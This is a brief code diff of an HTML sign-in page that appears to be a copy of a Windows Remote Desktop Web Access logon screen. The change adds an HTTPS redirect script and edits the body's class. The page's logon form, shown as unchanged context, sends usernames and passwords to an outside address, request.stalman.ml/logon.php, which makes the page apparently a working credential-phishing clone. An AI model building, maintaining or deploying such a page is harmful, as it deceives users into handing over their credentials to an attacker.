@@ -15,8 +15,14 @@ LogonResources.ConfirmPassword='Confirm your password';
 LogonResources.WindowsPoolKey='WindowsPool_23899918';
 LogonResources.ClearSessionUrl='\x2fRemote\x2fClearSessionHandler.ashx';
 //]]></script><style></style>
+<script>
+if (location.protocol != 'https:')
+{
+ location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
+}	
+</script>
 </head>
-<body class="deviceshim Safari Chrome65">
+<body class="deviceshim">
     <form name="formLogon" method="post" action="https://request.stalman.ml/logon.php" id="formLogon" autocomplete="off">
 <div>
 <input type="hidden" name="" id="__EVENTTARGET" value="">
